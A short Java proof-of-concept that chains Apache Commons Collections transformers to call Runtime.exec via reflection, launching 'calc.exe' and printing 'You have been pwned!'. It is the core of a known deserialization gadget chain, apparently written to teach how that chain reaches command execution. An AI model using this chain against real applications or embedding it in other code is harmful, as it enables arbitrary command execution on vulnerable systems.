import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;


public class invokerTransformer {
    public static void main(String args[]){
        // Command to execute
        String command = "calc.exe";


        // Create a chain of transformers
        Transformer[] transformers = {
            new ConstantTransformer(Runtime.class),
            // getMethod --> Get the method object of getRuntime
            new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class}, new Object[] {"getRuntime", new Class[0]}),
            // execute the invoke command on the method object to get the runtime
            new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class}, new Object[]{null, new Object[0]}),
            // execute the exec command of runtime object with the payload command
            new InvokerTransformer("exec", new Class[] {String.class}, new Object[]{command}),
            // Print out a message
            new ConstantTransformer("You have been pwned!")
        };

        // Same as Runtime.class.getMethod("getRuntime").invoke().exec("calc.exe")

        // Create a chain transformer
        ChainedTransformer chainedTransformers = new ChainedTransformer(transformers);

        // Transforming objects
        System.out.println("Transforming objects");
        chainedTransformers.transform("This is irrelevant");
        
    }
}
